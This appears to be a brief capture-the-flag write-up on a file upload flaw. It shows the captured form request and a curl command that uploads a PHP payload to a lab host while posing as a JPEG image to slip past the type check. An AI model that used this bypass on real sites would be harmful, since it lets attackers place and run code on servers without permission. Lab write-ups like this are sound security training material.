the goal was to upload and execute malicious code, flag is found upon uploading


trying to upload manually a payload via the site show the following request info


Content-Disposition: form-data; name="uploaded"; filename="test.php"
Content-Type: application/x-php

Content-Disposition: form-data; name="Upload"
Upload

the @ indicates curl should read a file rather than read a string
curl -X POST -F "uploaded=@payload.php;type=image/jpeg" -F "Upload=Upload" "http://192.168.1.16/index.php?page=upload" > output.html

check the output file for the flag

while we did upload a php file, if it isn't executed there is no value in this exploit
